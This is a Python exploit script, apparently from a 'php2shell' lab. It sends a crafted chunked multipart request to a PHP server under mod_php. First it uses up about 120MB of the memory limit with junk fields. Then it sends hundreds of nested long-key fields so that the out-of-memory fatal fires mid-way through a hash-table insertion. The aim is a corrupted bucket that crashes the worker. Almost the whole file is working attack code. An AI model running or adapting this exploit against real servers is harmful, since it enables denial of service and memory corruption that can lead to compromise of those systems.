#!/usr/bin/env python3
"""php2shell lab, variant 3: steer the OOM fatal INTO a hash-table key allocation.

Phase 1 (40 parts x 3MB values): consume ~120MB of the 128M memory_limit with
plain fields whose value buffers allocate cleanly.
Phase 2 (~950 parts, nested 400-char keys): each registration costs ~1.6KB in
buckets + zend_strings; somewhere here the memory_limit fatal fires INSIDE
_zend_hash_str_add_or_update_i AFTER nNumUsed/nNumOfElements were incremented
but BEFORE the key/zval assignments -> malformed bucket published.
mod_php teardown iterates arData to nNumUsed -> consumes garbage -> crash.

Usage: python3 oom3.py <base_url>
"""
import socket
import sys
from urllib.parse import urlparse

SID = "feedface0123456789abcdef01234567"
BOUND = "Steer618"
KEY = "a" * 400


def part_head(name, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return f"--{BOUND}\r\n{disp}\r\n\r\n".encode()


def main():
    base = sys.argv[1]
    u = urlparse(base)
    host, port, path = u.hostname, u.port or 80, u.path or "/"

    def chunk(data):
        return f"{len(data):x}\r\n".encode() + data + b"\r\n"

    s = socket.create_connection((host, port), timeout=90)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: oom3-steer\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s.sendall(head)

    # phase 1: ~120MB of benign 3MB fields
    mb3 = b"B" * (3 * 1024 * 1024)
    for i in range(40):
        s.sendall(chunk(part_head(f"j{i}") + mb3 + b"\r\n"))
        if i % 10 == 0:
            print(f"  junk {i*3}MB...", flush=True)

    # phase 2: 950 nested-key registrations, tiny values
    print("  nested keys...", flush=True)
    for i in range(950):
        name = f"f[{i}]" + f"[{KEY}]"
        s.sendall(chunk(part_head(name) + b"v\r\n"))

    s.sendall(chunk(f"--{BOUND}--\r\n".encode()))
    s.sendall(b"0\r\n\r\n")
    s.settimeout(30)
    chunks = []
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            chunks.append(d)
    except socket.timeout:
        pass
    s.close()
    resp = b"".join(chunks)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE (worker died mid-request)"
    print("status:", status)
    print("body head:", resp.split(b"\r\n\r\n", 1)[-1][:200])


if __name__ == "__main__":
    main()
